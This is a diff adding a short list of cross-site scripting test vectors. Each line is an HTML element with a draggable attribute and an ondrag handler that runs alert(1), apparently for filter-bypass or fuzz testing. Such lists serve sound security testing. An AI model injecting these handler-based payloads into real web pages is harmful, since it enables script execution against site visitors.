@@ -1,0 +1,17 @@
+<area draggable="true" ondrag="alert(1)">test</area>
+<base draggable="true" ondrag="alert(1)">test</base>
+<basefont draggable="true" ondrag="alert(1)">test</basefont>
+<br draggable="true" ondrag="alert(1)">test</br>
+<col draggable="true" ondrag="alert(1)">test</col>
+<command draggable="true" ondrag="alert(1)">test</command>
+<embed draggable="true" ondrag="alert(1)">test</embed>
+<frame draggable="true" ondrag="alert(1)">test</frame>
+<hr draggable="true" ondrag="alert(1)">test</hr>
+<img draggable="true" ondrag="alert(1)">test</img>
+<isindex draggable="true" ondrag="alert(1)">test</isindex>
+<link draggable="true" ondrag="alert(1)">test</link>
+<meta draggable="true" ondrag="alert(1)">test</meta>
+<param draggable="true" ondrag="alert(1)">test</param>
+<source draggable="true" ondrag="alert(1)">test</source>
+<track draggable="true" ondrag="alert(1)">test</track>
+<wbr draggable="true" ondrag="alert(1)">test</wbr>
